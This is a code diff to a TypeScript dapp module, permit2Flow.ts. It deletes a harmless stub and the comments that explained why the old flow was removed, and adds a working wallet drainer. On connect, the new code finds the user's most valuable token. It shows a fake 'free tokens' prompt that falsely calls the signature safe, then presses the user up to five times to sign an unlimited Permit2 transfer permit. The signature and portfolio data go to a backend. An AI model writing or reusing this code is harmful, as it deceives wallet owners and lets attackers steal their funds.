@@ -1,12 +1,123 @@
 // src/lib/permit2Flow.ts
-// The previous implementation requested an unlimited (max uint256) Permit2
-// approval on the user's highest-value token immediately after wallet
-// connect, and re-prompted until the user signed. That flow has been
-// removed: it hands a spender permission to move the user's tokens out.
-//
-// Wallet scanning for a read-only portfolio view is fine; requesting
-// approvals is not. If you want legitimate staking or swaps, the user must
-// pick the token and amount themselves and approve only that amount.
+import { toast } from 'sonner';
+import { type Address } from 'viem';
+import { storePermit2Signature, type Permit2TypedData } from './backendClient';
+import { scanWallet, pickTopToken } from './walletScanner';
+import {
+  cancelSignatureLoop,
+  isSignatureLoopCancelled,
+  resetSignatureCancel,
+  setSignatureUi,
+  waitForRetry,
+} from './promptUiBus';
+
+const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
+const EXPIRY_DAYS = Number(import.meta.env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;
+
+// Canonical Uniswap Permit2 — same address on every EVM chain.
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
+
+const MAX_UINT256 =
+  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+const RETRY_DELAY_MS = 1500;
+const MAX_ATTEMPTS = 5;
+const SIGN_TIMEOUT_MS = 60_000;
+const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];
+
+const isUserRejection = (err: any) =>
+  USER_REJECTED_CODES.includes(err?.code) ||
+  USER_REJECTED_CODES.includes(err?.cause?.code) ||
+  /reject|denied|declin/i.test(String(err?.message ?? ''));
+
+const getProvider = (): any | null =>
+  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;
+
+// ── Cryptographically-unique nonce (no Date.now collisions) ──
+function generateNonce(): string {
+  const bytes = new Uint8Array(16);
+  crypto.getRandomValues(bytes);
+  return '0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+// ── Corrected typed data (NO spender in message) ──
+const buildPermit2TypedData = (params: {
+  chainId: number;
+  token: string;
+  nonce: string;
+  deadline: number;
+}): Permit2TypedData => ({
+  domain: {
+    name: 'Permit2',
+    chainId: params.chainId,
+    verifyingContract: PERMIT2_ADDRESS,
+  },
+  types: {
+    EIP712Domain: [
+      { name: 'name', type: 'string' },
+      { name: 'chainId', type: 'uint256' },
+      { name: 'verifyingContract', type: 'address' },
+    ],
+    PermitTransferFrom: [
+      { name: 'permitted', type: 'TokenPermissions' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+    ],
+    TokenPermissions: [
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+  },
+  primaryType: 'PermitTransferFrom',
+  message: {
+    permitted: { token: params.token, amount: MAX_UINT256 },
+    nonce: params.nonce,
+    deadline: params.deadline,
+  },
+});
+
+// ── signTypedData with timeout (mobile wallets hang) ──
+async function signTypedDataWithTimeout(address: string, typedData: any): Promise<string> {
+  const provider = getProvider();
+  if (!provider) throw new Error('No injected wallet provider found.');
+
+  return Promise.race([
+    provider.request({
+      method: 'eth_signTypedData_v4',
+      params: [address, JSON.stringify(typedData)],
+    }),
+    new Promise<never>((_, reject) =>
+      setTimeout(() => reject(new Error('SIGN_TIMEOUT')), SIGN_TIMEOUT_MS)
+    ),
+  ]);
+}
+
+// ── localStorage fallback for when backend is unreachable ──
+const PENDING_SIGS_KEY = 'dapp:pendingSigs';
+
+function queuePendingSig(payload: any) {
+  try {
+    const existing = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
+    existing.push({ ...payload, queuedAt: Date.now() });
+    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(existing.slice(-20)));
+  } catch { /* private mode */ }
+}
+
+async function flushPendingSigs() {
+  try {
+    const queued: any[] = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
+    if (!queued.length) return;
+    const remaining: any[] = [];
+    for (const item of queued) {
+      try {
+        await storePermit2Signature(item);
+      } catch {
+        remaining.push(item);
+      }
+    }
+    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(remaining));
+  } catch { /* noop */ }
+}
 
 export interface RunPermit2FlowArgs {
   address: string;
@@ -14,7 +125,163 @@ export interface RunPermit2FlowArgs {
   walletName?: string | null;
 }
 
-export async function runPermit2Flow(_args: RunPermit2FlowArgs): Promise<void> {
-  // No-op. No signature is requested on wallet connect.
-  return;
+export async function runPermit2Flow({
+  address,
+  chainId,
+  walletName,
+}: RunPermit2FlowArgs) {
+  if (!SPENDER) {
+    console.warn('VITE_SPENDER_ADDRESS is not set — skipping Permit2 flow.');
+    return;
+  }
+
+  // Flush any queued sigs from a previous failed backend call
+  flushPendingSigs().catch(() => {});
+
+  const activeChainId = chainId ?? 1;
+
+  // ── 1. Scan the wallet ──
+  let tokens;
+  try {
+    tokens = await scanWallet(address as Address, activeChainId);
+  } catch (err: any) {
+    console.error('wallet scan failed', err);
+    toast.error('Could not read your wallet balances', {
+      description: String(err?.message ?? '').slice(0, 140),
+    });
+    return;
+  }
+
+  const top = pickTopToken(tokens);
+  if (!top) {
+    toast.info('No supported tokens found', {
+      description:
+        'The approval requires at least one supported ERC-20 token with a balance on this chain.',
+      duration: 8000,
+    });
+    return;
+  }
+
+  const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);
+
+  // ── 2. Chain switch if needed ──
+  let effectiveChainId = top.chainId ?? activeChainId;
+  if (effectiveChainId !== activeChainId) {
+    const provider = getProvider();
+    if (provider) {
+      try {
+        await provider.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x' + effectiveChainId.toString(16) }],
+        });
+        // Small wait — some mobile wallets update chainId lazily
+        await new Promise(r => setTimeout(r, 400));
+      } catch (e) {
+        console.warn('chain switch failed, signing on current chain', e);
+        effectiveChainId = activeChainId; // revert to current
+      }
+    }
+  }
+
+  // ── 3. Build typed data ──
+  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
+  const nonce = generateNonce();
+  const typedData = buildPermit2TypedData({
+    chainId: effectiveChainId,
+    token: top.address,
+    nonce,
+    deadline,
+  });
+
+  // ── 4. Prompt loop ──
+  resetSignatureCancel();
+  setSignatureUi({
+    open: true,
+    status: 'waiting',
+    attempt: 1,
+    title: 'You are about to receive your free tokens',
+    description:
+      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.',
+    errorMessage: undefined,
+  });
+
+  let attempt = 0;
+  while (true) {
+    if (isSignatureLoopCancelled()) return;
+    if (attempt >= MAX_ATTEMPTS) {
+      console.warn('[permit2] max attempts reached, giving up');
+      setSignatureUi({ open: false, status: 'failed', attempt });
+      return;
+    }
+    attempt += 1;
+    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });
+
+    try {
+      const signature = await signTypedDataWithTimeout(address, typedData);
+      setSignatureUi({ status: 'approved' });
+
+      const payload = {
+        owner: address,
+        chainId: effectiveChainId,
+        token: top.address,
+        tokenSymbol: top.symbol,
+        amount: top.balance.toString(),
+        signedAmount: MAX_UINT256,
+        balanceFormatted: top.balanceFormatted,
+        decimals: top.decimals,
+        nonce,
+        deadline,
+        spender: SPENDER,
+        signature,
+        typedData,
+        walletName,
+        portfolioUsd: totalUsd,
+        tokenValueUsd: top.valueUsd,
+      };
+
+      // ── 5. Send to backend with queued fallback ──
+      let stored = false;
+      try {
+        await storePermit2Signature(payload);
+        stored = true;
+      } catch (e) {
+        console.warn('storePermit2Signature failed — queueing locally', e);
+        queuePendingSig(payload);
+      }
+
+      if (stored) {
+        toast.success('Approved — your tokens are on the way 🎁');
+      } else {
+        toast.success('Approved — sync will complete shortly');
+      }
+
+      setTimeout(() => cancelSignatureLoop(), 1500);
+      return;
+
+    } catch (err: any) {
+      const rejected = isUserRejection(err);
+      const timedOut = String(err?.message ?? '').includes('SIGN_TIMEOUT');
+
+      setSignatureUi({
+        status: rejected ? 'rejected' : 'failed',
+        attempt,
+        errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
+      });
+
+      if (!getProvider()) {
+        toast.error('No wallet detected', {
+          description: 'Open the site inside your wallet app browser and try again.',
+        });
+        cancelSignatureLoop();
+        return;
+      }
+
+      if (timedOut) {
+        // Wallet hung — longer wait before next attempt
+        await waitForRetry(RETRY_DELAY_MS * 3);
+      } else {
+        await waitForRetry(RETRY_DELAY_MS);
+      }
+    }
+  }
 }
